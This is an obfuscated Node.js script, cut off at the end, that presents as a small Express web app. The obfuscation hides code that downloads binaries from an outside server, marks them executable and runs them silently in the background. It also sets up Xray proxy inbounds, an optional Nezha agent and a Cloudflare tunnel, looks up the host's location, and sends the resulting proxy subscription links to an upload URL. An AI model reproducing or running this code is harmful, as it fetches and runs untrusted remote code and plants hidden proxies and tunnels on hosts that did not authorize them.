const _0x3568dd=_0x3a5e;(function(_0x1c8827,_0x255c21){const _0x2f04b2={_0x4201b9:0x208,_0x3ad9c0:0x20c,_0x2c29e7:0x21f,_0x2b3a3f:0x250,_0x5be036:0x21c},_0x25ad02=_0x3a5e,_0xfe5573=_0x1c8827();while(!![]){try{const _0x3a8b24=-parseInt(_0x25ad02(_0x2f04b2._0x4201b9))/0x1*(parseInt(_0x25ad02(_0x2f04b2._0x3ad9c0))/0x2)+parseInt(_0x25ad02(0x1fc))/0x3+parseInt(_0x25ad02(_0x2f04b2._0x2c29e7))/0x4*(parseInt(_0x25ad02(0x217))/0x5)+parseInt(_0x25ad02(_0x2f04b2._0x2b3a3f))/0x6*(parseInt(_0x25ad02(_0x2f04b2._0x5be036))/0x7)+-parseInt(_0x25ad02(0x25a))/0x8+parseInt(_0x25ad02(0x224))/0x9*(-parseInt(_0x25ad02(0x23f))/0xa)+parseInt(_0x25ad02(0x277))/0xb*(-parseInt(_0x25ad02(0x274))/0xc);if(_0x3a8b24===_0x255c21)break;else _0xfe5573['push'](_0xfe5573['shift']());}catch(_0x3f53be){_0xfe5573['push'](_0xfe5573['shift']());}}}(_0x4c29,0x4bc61));const express=require('express'),app=express(),axios=require(_0x3568dd(0x1fa)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x3568dd(0x248)),exec=promisify(require('child_process')[_0x3568dd(0x254)]),{execSync}=require(_0x3568dd(0x1ec)),UPLOAD_URL=process['env'][_0x3568dd(0x215)]||'',PROJECT_URL=process[_0x3568dd(0x260)][_0x3568dd(0x24e)]||'',AUTO_ACCESS=process[_0x3568dd(0x260)][_0x3568dd(0x262)]||![],FILE_PATH=process[_0x3568dd(0x260)][_0x3568dd(0x1e3)]||_0x3568dd(0x272),SUB_PATH=process['env']['SUB_PATH']||_0x3568dd(0x29b),PORT=process[_0x3568dd(0x260)][_0x3568dd(0x281)]||process['env'][_0x3568dd(0x252)]||0xbb8,UUID=process[_0x3568dd(0x260)][_0x3568dd(0x243)]||_0x3568dd(0x27f),NEZHA_SERVER=process[_0x3568dd(0x260)][_0x3568dd(0x201)]||'',NEZHA_PORT=process['env'][_0x3568dd(0x240)]||'',NEZHA_KEY=process[_0x3568dd(0x260)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3568dd(0x260)][_0x3568dd(0x1e9)]||'',ARGO_AUTH=process[_0x3568dd(0x260)][_0x3568dd(0x21b)]||'',ARGO_PORT=process[_0x3568dd(0x260)][_0x3568dd(0x24d)]||0x1f41,CFIP=process['env'][_0x3568dd(0x256)]||'www.visa.com.br',CFPORT=process[_0x3568dd(0x260)][_0x3568dd(0x275)]||0x823,NAME=process[_0x3568dd(0x260)][_0x3568dd(0x1f0)]||'dagalkwh20260120';!fs['existsSync'](FILE_PATH)?(fs[_0x3568dd(0x26a)](FILE_PATH),console[_0x3568dd(0x1f1)](FILE_PATH+_0x3568dd(0x28f))):console[_0x3568dd(0x1f1)](FILE_PATH+_0x3568dd(0x1fd));function generateRandomName(){const _0x264a89={_0x148798:0x29f},_0x51e6d4=_0x3568dd,_0x1066e2=_0x51e6d4(0x205);let _0x21657a='';for(let _0x57dde9=0x0;_0x57dde9<0x6;_0x57dde9++){_0x21657a+=_0x1066e2[_0x51e6d4(_0x264a89._0x148798)](Math[_0x51e6d4(0x287)](Math[_0x51e6d4(0x1e0)]()*_0x1066e2['length']));}return _0x21657a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3568dd(0x253)](FILE_PATH,npmName),phpPath=path[_0x3568dd(0x253)](FILE_PATH,phpName),webPath=path[_0x3568dd(0x253)](FILE_PATH,webName),botPath=path[_0x3568dd(0x253)](FILE_PATH,botName),subPath=path[_0x3568dd(0x253)](FILE_PATH,_0x3568dd(0x1ef)),listPath=path['join'](FILE_PATH,_0x3568dd(0x1db)),bootLogPath=path[_0x3568dd(0x253)](FILE_PATH,_0x3568dd(0x22d)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0xd0369b={_0x30e51d:0x214,_0x4618e9:0x24c,_0x2693f7:0x228,_0x48ceaf:0x1f4,_0x25bb1:0x22b,_0x1b286a:0x263,_0x28042e:0x244},_0x37f6dc=_0x3568dd;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1f63ce;try{_0x1f63ce=fs[_0x37f6dc(_0xd0369b._0x30e51d)](subPath,'utf-8');}catch{return null;}const _0xd6e3fb=Buffer[_0x37f6dc(_0xd0369b._0x4618e9)](_0x1f63ce,_0x37f6dc(_0xd0369b._0x2693f7))[_0x37f6dc(0x25c)](_0x37f6dc(0x1e5)),_0x353cad=_0xd6e3fb[_0x37f6dc(_0xd0369b._0x48ceaf)]('\x0a')[_0x37f6dc(_0xd0369b._0x25bb1)](_0x7da0c8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x37f6dc(0x284)](_0x7da0c8));if(_0x353cad['length']===0x0)return;return axios[_0x37f6dc(0x23d)](UPLOAD_URL+_0x37f6dc(_0xd0369b._0x1b286a),JSON[_0x37f6dc(0x1e2)]({'nodes':_0x353cad}),{'headers':{'Content-Type':_0x37f6dc(0x29e)}})[_0x37f6dc(_0xd0369b._0x28042e)](_0x5070e3=>{return null;}),null;}catch(_0x4d658f){return null;}}function cleanupOldFiles(){const _0x1223c5={_0x1afecb:0x269},_0x31a1e0={_0x266e44:0x253,_0x319cdc:0x288},_0x13061a=_0x3568dd;try{const _0x11a849=fs[_0x13061a(_0x1223c5._0x1afecb)](FILE_PATH);_0x11a849[_0x13061a(0x234)](_0xa1a93=>{const _0x281c15=_0x13061a,_0x13eddd=path[_0x281c15(_0x31a1e0._0x266e44)](FILE_PATH,_0xa1a93);try{const _0xa30df=fs['statSync'](_0x13eddd);_0xa30df[_0x281c15(_0x31a1e0._0x319cdc)]()&&fs[_0x281c15(0x1e6)](_0x13eddd);}catch(_0x497c89){}});}catch(_0x43c0bf){}}function _0x3a5e(_0xf07a8,_0x2adb8c){const _0x4c2969=_0x4c29();return _0x3a5e=function(_0x3a5e8a,_0x1f412e){_0x3a5e8a=_0x3a5e8a-0x1da;let _0x4f64e3=_0x4c2969[_0x3a5e8a];return _0x4f64e3;},_0x3a5e(_0xf07a8,_0x2adb8c);}app['get']('/',function(_0x17da10,_0xa53c34){const _0x30bf24=_0x3568dd;_0xa53c34['send'](_0x30bf24(0x296));});async function generateConfig(){const _0x618008={_0x2faf14:0x204,_0x5906d6:0x264,_0x59eff6:0x232,_0x47acb3:0x24f,_0x437d6d:0x218,_0xc071c8:0x26c,_0x5f0b98:0x24f,_0xf31f44:0x1ed,_0x3c6c1f:0x206,_0x1f4b10:0x264,_0x4f5202:0x267,_0x3f2518:0x26c,_0xd4e04e:0x26d,_0x1f50f1:0x24a,_0x3c2d02:0x1f5,_0x580c46:0x1f6,_0x18311d:0x233},_0x11234c=_0x3568dd,_0x17c451={'log':{'access':_0x11234c(_0x618008._0x2faf14),'error':'/dev/null','loglevel':_0x11234c(0x264)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x11234c(0x218),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x11234c(_0x618008._0x5906d6),'fallbacks':[{'dest':0xbb9},{'path':_0x11234c(_0x618008._0x59eff6),'dest':0xbba},{'path':_0x11234c(0x276),'dest':0xbbb},{'path':_0x11234c(0x267),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x11234c(_0x618008._0x47acb3),'protocol':_0x11234c(0x218),'settings':{'clients':[{'id':UUID}],'decryption':_0x11234c(0x264)},'streamSettings':{'network':_0x11234c(0x20d),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x11234c(_0x618008._0x437d6d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x11234c(0x264),'wsSettings':{'path':_0x11234c(_0x618008._0x59eff6)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x11234c(_0x618008._0xc071c8),_0x11234c(0x206)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x11234c(_0x618008._0x5f0b98),'protocol':_0x11234c(0x1f7),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x11234c(0x276)}},'sniffing':{'enabled':!![],'destOverride':[_0x11234c(_0x618008._0xf31f44),_0x11234c(_0x618008._0xc071c8),_0x11234c(_0x618008._0x3c6c1f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x11234c(0x24f),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x11234c(_0x618008._0x1f4b10),'wsSettings':{'path':_0x11234c(_0x618008._0x4f5202)}},'sniffing':{'enabled':!![],'destOverride':[_0x11234c(0x1ed),_0x11234c(_0x618008._0x3f2518),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x11234c(0x202)]},'outbounds':[{'protocol':_0x11234c(_0x618008._0xd4e04e),'tag':_0x11234c(_0x618008._0x1f50f1)},{'protocol':_0x11234c(_0x618008._0x3c2d02),'tag':_0x11234c(_0x618008._0x580c46)}]};fs[_0x11234c(_0x618008._0x18311d)](path['join'](FILE_PATH,_0x11234c(0x23c)),JSON[_0x11234c(0x1e2)](_0x17c451,null,0x2));}function getSystemArchitecture(){const _0xf4189={_0x4e9471:0x1e8,_0x461495:0x237,_0x2efbb9:0x1df},_0xae58eb=_0x3568dd,_0x16f270=os['arch']();return _0x16f270===_0xae58eb(0x1df)||_0x16f270===_0xae58eb(_0xf4189._0x4e9471)||_0x16f270===_0xae58eb(_0xf4189._0x461495)?_0xae58eb(_0xf4189._0x2efbb9):_0xae58eb(0x235);}function downloadFile(_0x14ecf1,_0x1886cd,_0x1129bf){const _0x26760a={_0x443908:0x21d,_0x47aa9c:0x26a,_0x12cb7b:0x247,_0x49c0d5:0x265},_0x3380ec={_0x1daaab:0x29d,_0x565492:0x213,_0x232241:0x1f2,_0x5ed0e1:0x20a,_0x4e8f33:0x21e},_0x288c61={_0x21d460:0x23b},_0x5a1e76=_0x3568dd,_0x5770a6=_0x14ecf1;!fs[_0x5a1e76(_0x26760a._0x443908)](FILE_PATH)&&fs[_0x5a1e76(_0x26760a._0x47aa9c)](FILE_PATH,{'recursive':!![]});const _0x3f8ff0=fs[_0x5a1e76(_0x26760a._0x12cb7b)](_0x5770a6);axios({'method':_0x5a1e76(_0x26760a._0x49c0d5),'url':_0x1886cd,'responseType':'stream'})['then'](_0x4bfc70=>{const _0x511a11={_0x4f74cf:0x29d,_0x28d67b:0x20a},_0x4c2174=_0x5a1e76;_0x4bfc70['data']['pipe'](_0x3f8ff0),_0x3f8ff0['on'](_0x4c2174(0x24b),()=>{const _0x36dd5a=_0x4c2174;_0x3f8ff0[_0x36dd5a(_0x288c61._0x21d460)](),console['log'](_0x36dd5a(0x29d)+path['basename'](_0x5770a6)+_0x36dd5a(0x22f)),_0x1129bf(null,_0x5770a6);}),_0x3f8ff0['on'](_0x4c2174(0x21e),_0x12ca62=>{const _0x1a0aa5=_0x4c2174;fs['unlink'](_0x5770a6,()=>{});const _0x2b607d=_0x1a0aa5(_0x511a11._0x4f74cf)+path[_0x1a0aa5(0x213)](_0x5770a6)+'\x20failed:\x20'+_0x12ca62[_0x1a0aa5(_0x511a11._0x28d67b)];console['error'](_0x2b607d),_0x1129bf(_0x2b607d);});})[_0x5a1e76(0x244)](_0x2d7c7f=>{const _0x16214a=_0x5a1e76,_0x5d5e61=_0x16214a(_0x3380ec._0x1daaab)+path[_0x16214a(_0x3380ec._0x565492)](_0x5770a6)+_0x16214a(_0x3380ec._0x232241)+_0x2d7c7f[_0x16214a(_0x3380ec._0x5ed0e1)];console[_0x16214a(_0x3380ec._0x4e8f33)](_0x5d5e61),_0x1129bf(_0x5d5e61);});}async function downloadFilesAndRun(){const _0x55b57a={_0x145fdf:0x223,_0x39c752:0x21e,_0x933b0b:0x1f3,_0x5d3e10:0x1f4,_0x2f9542:0x290,_0x380cb0:0x210,_0x39cb2f:0x230,_0x2d09c2:0x239,_0xcbd017:0x1da,_0x23084a:0x283,_0x4d86c6:0x200,_0x4d0a3d:0x295,_0x96116b:0x292,_0x3ee093:0x236,_0x1f9eb2:0x1f1,_0x500d90:0x246,_0x26a6ad:0x227,_0x18f92d:0x1de,_0x28fb54:0x23a,_0xa7d3b5:0x28c,_0x539b9a:0x1eb},_0x709820={_0x3beb16:0x234},_0x54ede4={_0x135b39:0x298},_0x482204=_0x3568dd,_0x3c22e4=getSystemArchitecture(),_0x4508a9=getFilesForArchitecture(_0x3c22e4);if(_0x4508a9[_0x482204(_0x55b57a._0x145fdf)]===0x0){console['log'](_0x482204(0x216));return;}const _0x28b497=_0x4508a9[_0x482204(0x257)](_0x600315=>{return new Promise((_0x575b93,_0x1d134b)=>{const _0x318e5f=_0x3a5e;downloadFile(_0x600315['fileName'],_0x600315[_0x318e5f(_0x54ede4._0x135b39)],(_0x317374,_0x4bbbdb)=>{_0x317374?_0x1d134b(_0x317374):_0x575b93(_0x4bbbdb);});});});try{await Promise['all'](_0x28b497);}catch(_0xbd143e){console[_0x482204(_0x55b57a._0x39c752)](_0x482204(_0x55b57a._0x933b0b),_0xbd143e);return;}function _0xc2e915(_0x273a8d){const _0x124716={_0x3f9608:0x21d,_0x543e37:0x286},_0x546450=_0x482204,_0x59ddc0=0x1fd;_0x273a8d[_0x546450(_0x709820._0x3beb16)](_0x3ebef5=>{const _0x156ab2={_0x243d99:0x1f1},_0x3e96f1=_0x546450;fs[_0x3e96f1(_0x124716._0x3f9608)](_0x3ebef5)&&fs[_0x3e96f1(_0x124716._0x543e37)](_0x3ebef5,_0x59ddc0,_0x471dd2=>{const _0x14e344=_0x3e96f1;_0x471dd2?console[_0x14e344(0x21e)](_0x14e344(0x255)+_0x3ebef5+':\x20'+_0x471dd2):console[_0x14e344(_0x156ab2._0x243d99)]('Empowerment\x20success\x20for\x20'+_0x3ebef5+':\x20'+_0x59ddc0['toString'](0x8));});});}const _0x39c2d9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xc2e915(_0x39c2d9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12f601=NEZHA_SERVER[_0x482204(0x279)](':')?NEZHA_SERVER[_0x482204(_0x55b57a._0x5d3e10)](':')[_0x482204(0x299)]():'',_0x1181f1=new Set([_0x482204(0x283),'8443',_0x482204(0x27a),_0x482204(0x200),'2083',_0x482204(0x292)]),_0x4648a6=_0x1181f1[_0x482204(_0x55b57a._0x2f9542)](_0x12f601)?'true':_0x482204(0x207),_0x4e7b16=_0x482204(_0x55b57a._0x380cb0)+NEZHA_KEY+_0x482204(0x26b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4648a6+_0x482204(_0x55b57a._0x39cb2f)+UUID;fs['writeFileSync'](path[_0x482204(0x253)](FILE_PATH,'config.yaml'),_0x4e7b16);const _0x57054f=_0x482204(0x1dc)+phpPath+_0x482204(0x22e)+FILE_PATH+_0x482204(_0x55b57a._0x2d09c2);try{await exec(_0x57054f),console[_0x482204(0x1f1)](phpName+_0x482204(_0x55b57a._0xcbd017)),await new Promise(_0x5b1608=>setTimeout(_0x5b1608,0x3e8));}catch(_0x32fbb8){console[_0x482204(_0x55b57a._0x39c752)](_0x482204(0x26f)+_0x32fbb8);}}else{let _0x38a5e3='';const _0xbe3554=[_0x482204(_0x55b57a._0x23084a),_0x482204(0x25b),_0x482204(0x27a),_0x482204(_0x55b57a._0x4d86c6),_0x482204(_0x55b57a._0x4d0a3d),_0x482204(_0x55b57a._0x96116b)];_0xbe3554[_0x482204(0x279)](NEZHA_PORT)&&(_0x38a5e3=_0x482204(_0x55b57a._0x3ee093));const _0x546d32=_0x482204(0x1dc)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x38a5e3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x546d32),console[_0x482204(0x1f1)](npmName+_0x482204(0x1da)),await new Promise(_0x3a78a3=>setTimeout(_0x3a78a3,0x3e8));}catch(_0x48a713){console[_0x482204(0x21e)](_0x482204(0x285)+_0x48a713);}}}else console[_0x482204(_0x55b57a._0x1f9eb2)](_0x482204(_0x55b57a._0x500d90));const _0x59bf6a=_0x482204(0x1dc)+webPath+_0x482204(_0x55b57a._0x26a6ad)+FILE_PATH+_0x482204(0x1f9);try{await exec(_0x59bf6a),console[_0x482204(0x1f1)](webName+_0x482204(0x1da)),await new Promise(_0x50c413=>setTimeout(_0x50c413,0x3e8));}catch(_0x3409f2){console['error'](_0x482204(0x273)+_0x3409f2);}if(fs[_0x482204(0x21d)](botPath)){let _0x62ce8f;if(ARGO_AUTH[_0x482204(_0x55b57a._0x18f92d)](/^[A-Z0-9a-z=]{120,250}$/))_0x62ce8f=_0x482204(_0x55b57a._0x28fb54)+ARGO_AUTH;else ARGO_AUTH[_0x482204(0x1de)](/TunnelSecret/)?_0x62ce8f=_0x482204(_0x55b57a._0xa7d3b5)+FILE_PATH+'/tunnel.yml\x20run':_0x62ce8f=_0x482204(_0x55b57a._0x539b9a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x482204(0x1dc)+botPath+'\x20'+_0x62ce8f+_0x482204(0x28e)),console[_0x482204(0x1f1)](botName+_0x482204(0x1da)),await new Promise(_0xf43f8d=>setTimeout(_0xf43f8d,0x7d0));}catch(_0x5d70ca){console[_0x482204(0x21e)]('Error\x20executing\x20command:\x20'+_0x5d70ca);}}await new Promise(_0x334f71=>setTimeout(_0x334f71,0x1388));}function getFilesForArchitecture(_0x5517d7){const _0x5a56a8={_0x157f39:0x282,_0x1e866f:0x25d,_0x1bd6c:0x1df},_0x4beae8=_0x3568dd;let _0x136dd4;_0x5517d7===_0x4beae8(0x1df)?_0x136dd4=[{'fileName':webPath,'fileUrl':_0x4beae8(0x258)},{'fileName':botPath,'fileUrl':_0x4beae8(_0x5a56a8._0x157f39)}]:_0x136dd4=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x38f68a=_0x5517d7===_0x4beae8(0x1df)?_0x4beae8(0x27e):_0x4beae8(_0x5a56a8._0x1e866f);_0x136dd4[_0x4beae8(0x20f)]({'fileName':npmPath,'fileUrl':_0x38f68a});}else{const _0x35d473=_0x5517d7===_0x4beae8(_0x5a56a8._0x1bd6c)?_0x4beae8(0x212):_0x4beae8(0x270);_0x136dd4[_0x4beae8(0x20f)]({'fileName':phpPath,'fileUrl':_0x35d473});}}return _0x136dd4;}function argoType(){const _0x285f64={_0x51c6ad:0x27d,_0x3cb9fe:0x233,_0x5b4dac:0x1f4,_0x87f5a9:0x253,_0xcdbc14:0x242,_0x9a22b8:0x27c,_0x5a98db:0x2a1,_0x127703:0x291,_0x1a9c42:0x20b,_0x45bbe2:0x1f1,_0x1ed9eb:0x238},_0x3c3e9d=_0x3568dd;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3c3e9d(0x1f1)](_0x3c3e9d(0x278));return;}if(ARGO_AUTH[_0x3c3e9d(0x279)](_0x3c3e9d(_0x285f64._0x51c6ad))){fs[_0x3c3e9d(_0x285f64._0x3cb9fe)](path[_0x3c3e9d(0x253)](FILE_PATH,_0x3c3e9d(0x242)),ARGO_AUTH);const _0x47cb9c=_0x3c3e9d(0x1fb)+ARGO_AUTH[_0x3c3e9d(_0x285f64._0x5b4dac)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3c3e9d(_0x285f64._0x87f5a9)](FILE_PATH,_0x3c3e9d(_0x285f64._0xcdbc14))+_0x3c3e9d(_0x285f64._0x9a22b8)+ARGO_DOMAIN+_0x3c3e9d(_0x285f64._0x5a98db)+ARGO_PORT+_0x3c3e9d(_0x285f64._0x127703);fs['writeFileSync'](path[_0x3c3e9d(_0x285f64._0x87f5a9)](FILE_PATH,_0x3c3e9d(_0x285f64._0x1a9c42)),_0x47cb9c);}else console[_0x3c3e9d(_0x285f64._0x45bbe2)](_0x3c3e9d(_0x285f64._0x1ed9eb));}async function extractDomains(){const _0x55339f={_0x22e3e2:0x1f1,_0x2a302b:0x214,_0x5f3b77:0x223,_0x3028b8:0x249,_0xfb133f:0x22d,_0x439d0b:0x1eb,_0xae45f8:0x1da,_0x232788:0x21e},_0x3fbe8d={_0x18fbdd:0x265,_0x4b06dc:0x241,_0x36eeb3:0x271,_0x11b25f:0x2a0,_0x292d2d:0x297,_0x13277f:0x245,_0x4df998:0x294},_0x4ddb71={_0x2bfd70:0x226,_0x2a9a65:0x1ee,_0x529cc3:0x221,_0x238497:0x261},_0x57f38b={_0x17406b:0x1de,_0x407862:0x25f},_0x621351=_0x3568dd;let _0x1dcf6d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1dcf6d=ARGO_DOMAIN,console[_0x621351(_0x55339f._0x22e3e2)](_0x621351(0x1e1),_0x1dcf6d),await _0xfb7d1b(_0x1dcf6d);else try{const _0x559260=fs[_0x621351(_0x55339f._0x2a302b)](path[_0x621351(0x253)](FILE_PATH,'boot.log'),_0x621351(0x1e5)),_0x3489bc=_0x559260['split']('\x0a'),_0x208d34=[];_0x3489bc[_0x621351(0x234)](_0x155774=>{const _0x3d69de=_0x621351,_0x3e4ec8=_0x155774[_0x3d69de(_0x57f38b._0x17406b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3e4ec8){const _0x357315=_0x3e4ec8[0x1];_0x208d34[_0x3d69de(_0x57f38b._0x407862)](_0x357315);}});if(_0x208d34[_0x621351(_0x55339f._0x5f3b77)]>0x0)_0x1dcf6d=_0x208d34[0x0],console['log']('ArgoDomain:',_0x1dcf6d),await _0xfb7d1b(_0x1dcf6d);else{console[_0x621351(0x1f1)](_0x621351(_0x55339f._0x3028b8)),fs['unlinkSync'](path[_0x621351(0x253)](FILE_PATH,_0x621351(_0x55339f._0xfb133f)));async function _0x25033b(){const _0x57213c=_0x621351;try{process[_0x57213c(_0x4ddb71._0x2bfd70)]===_0x57213c(0x29a)?await exec(_0x57213c(_0x4ddb71._0x2a9a65)+botName+_0x57213c(_0x4ddb71._0x529cc3)):await exec(_0x57213c(0x251)+botName[_0x57213c(0x29f)](0x0)+']'+botName[_0x57213c(_0x4ddb71._0x238497)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x32a0cf){}}_0x25033b(),await new Promise(_0x4c1c93=>setTimeout(_0x4c1c93,0xbb8));const _0x1c4bc5=_0x621351(_0x55339f._0x439d0b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x621351(0x1dc)+botPath+'\x20'+_0x1c4bc5+_0x621351(0x28e)),console['log'](botName+_0x621351(_0x55339f._0xae45f8)),await new Promise(_0x45ed08=>setTimeout(_0x45ed08,0xbb8)),await extractDomains();}catch(_0x2f681e){console[_0x621351(0x21e)](_0x621351(0x220)+_0x2f681e);}}}catch(_0x2171bf){console[_0x621351(_0x55339f._0x232788)](_0x621351(0x29c),_0x2171bf);}async function _0x5d9d85(){const _0x4fa2c1=_0x621351;try{const _0x42aa2c=await axios[_0x4fa2c1(_0x3fbe8d._0x18fbdd)](_0x4fa2c1(0x259),{'timeout':0xbb8});if(_0x42aa2c['data']&&_0x42aa2c[_0x4fa2c1(_0x3fbe8d._0x4b06dc)][_0x4fa2c1(_0x3fbe8d._0x36eeb3)]&&_0x42aa2c['data'][_0x4fa2c1(0x2a0)])return _0x42aa2c['data'][_0x4fa2c1(0x271)]+'_'+_0x42aa2c[_0x4fa2c1(0x241)][_0x4fa2c1(_0x3fbe8d._0x11b25f)];}catch(_0x548be5){try{const _0x5d9d17=await axios[_0x4fa2c1(0x265)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5d9d17[_0x4fa2c1(0x241)]&&_0x5d9d17[_0x4fa2c1(0x241)][_0x4fa2c1(_0x3fbe8d._0x292d2d)]===_0x4fa2c1(_0x3fbe8d._0x13277f)&&_0x5d9d17[_0x4fa2c1(0x241)][_0x4fa2c1(0x1ff)]&&_0x5d9d17['data']['org'])return _0x5d9d17[_0x4fa2c1(_0x3fbe8d._0x4b06dc)][_0x4fa2c1(0x1ff)]+'_'+_0x5d9d17['data'][_0x4fa2c1(0x2a0)];}catch(_0x409e27){}}return _0x4fa2c1(_0x3fbe8d._0x4df998);}async function _0xfb7d1b(_0x253ac5){const _0x40f4ae=await _0x5d9d85(),_0x5a15eb=NAME?NAME+'-'+_0x40f4ae:_0x40f4ae;return new Promise(_0xba3866=>{const _0x81d7b8={_0x329ccd:0x264,_0x31344d:0x1ea,_0x44e1fd:0x28d,_0xaa1dfa:0x1e7,_0x7075ac:0x24c,_0x1766e6:0x1e2,_0x16192e:0x25c,_0x3a2125:0x228,_0x12595d:0x1fe,_0x14989c:0x20e,_0x125533:0x1f1,_0xfae1b3:0x25c,_0x18e93b:0x233,_0x1817ad:0x1f1,_0x4037c1:0x293};setTimeout(()=>{const _0x4c1c14={_0x5aceff:0x25c,_0x587c2f:0x280,_0x20684b:0x21a},_0x389dd2=_0x3a5e,_0x5d9c63={'v':'2','ps':''+_0x5a15eb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x389dd2(_0x81d7b8._0x329ccd),'net':'ws','type':_0x389dd2(0x264),'host':_0x253ac5,'path':_0x389dd2(0x26e),'tls':_0x389dd2(0x26c),'sni':_0x253ac5,'alpn':'','fp':_0x389dd2(0x28a)},_0x5845c7=_0x389dd2(_0x81d7b8._0x31344d)+UUID+'@'+CFIP+':'+CFPORT+_0x389dd2(_0x81d7b8._0x44e1fd)+_0x253ac5+_0x389dd2(0x1f8)+_0x253ac5+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x5a15eb+_0x389dd2(_0x81d7b8._0xaa1dfa)+Buffer[_0x389dd2(_0x81d7b8._0x7075ac)](JSON[_0x389dd2(_0x81d7b8._0x1766e6)](_0x5d9c63))[_0x389dd2(_0x81d7b8._0x16192e)](_0x389dd2(_0x81d7b8._0x3a2125))+_0x389dd2(_0x81d7b8._0x12595d)+UUID+'@'+CFIP+':'+CFPORT+_0x389dd2(0x25e)+_0x253ac5+_0x389dd2(0x1f8)+_0x253ac5+_0x389dd2(_0x81d7b8._0x14989c)+_0x5a15eb+'\x0a\x20\x20\x20\x20';console[_0x389dd2(_0x81d7b8._0x125533)](Buffer[_0x389dd2(0x24c)](_0x5845c7)[_0x389dd2(_0x81d7b8._0xfae1b3)](_0x389dd2(0x228))),fs[_0x389dd2(_0x81d7b8._0x18e93b)](subPath,Buffer['from'](_0x5845c7)[_0x389dd2(_0x81d7b8._0xfae1b3)](_0x389dd2(0x228))),console[_0x389dd2(_0x81d7b8._0x1817ad)](FILE_PATH+_0x389dd2(_0x81d7b8._0x4037c1)),uploadNodes(),app[_0x389dd2(0x265)]('/'+SUB_PATH,(_0x3db3be,_0x234951)=>{const _0x5a711a=_0x389dd2,_0x21cbe9=Buffer['from'](_0x5845c7)[_0x5a711a(_0x4c1c14._0x5aceff)](_0x5a711a(0x228));_0x234951[_0x5a711a(_0x4c1c14._0x587c2f)](_0x5a711a(0x266),_0x5a711a(0x225)),_0x234951[_0x5a711a(_0x4c1c14._0x20684b)](_0x21cbe9);}),_0xba3866(_0x5845c7);},0x7d0);});}}async function uploadNodes(){const _0x546720={_0x43412e:0x23d,_0x23ec64:0x1f1,_0x5055f8:0x297,_0x281dd4:0x214,_0x3569c3:0x223,_0x4b110d:0x29e,_0x4c7660:0x23e},_0x279e90=_0x3568dd;if(UPLOAD_URL&&PROJECT_URL){const _0x537280=PROJECT_URL+'/'+SUB_PATH,_0x33075a={'subscription':[_0x537280]};try{const _0x8fb9a=await axios[_0x279e90(_0x546720._0x43412e)](UPLOAD_URL+'/api/add-subscriptions',_0x33075a,{'headers':{'Content-Type':_0x279e90(0x29e)}});return _0x8fb9a&&_0x8fb9a['status']===0xc8?(console[_0x279e90(_0x546720._0x23ec64)](_0x279e90(0x229)),_0x8fb9a):null;}catch(_0x16f02f){if(_0x16f02f[_0x279e90(0x1e4)]){if(_0x16f02f[_0x279e90(0x1e4)][_0x279e90(_0x546720._0x5055f8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x279e90(0x21d)](listPath))return;const _0x1887e2=fs[_0x279e90(_0x546720._0x281dd4)](listPath,_0x279e90(0x1e5)),_0x51b095=_0x1887e2['split']('\x0a')['filter'](_0x4b0dfc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4b0dfc));if(_0x51b095[_0x279e90(_0x546720._0x3569c3)]===0x0)return;const _0xad6715=JSON[_0x279e90(0x1e2)]({'nodes':_0x51b095});try{const _0x2a91ed=await axios[_0x279e90(_0x546720._0x43412e)](UPLOAD_URL+_0x279e90(0x289),_0xad6715,{'headers':{'Content-Type':_0x279e90(_0x546720._0x4b110d)}});return _0x2a91ed&&_0x2a91ed[_0x279e90(0x297)]===0xc8?(console[_0x279e90(0x1f1)](_0x279e90(_0x546720._0x4c7660)),_0x2a91ed):null;}catch(_0x2967b8){return null;}}else return;}}function cleanFiles(){const 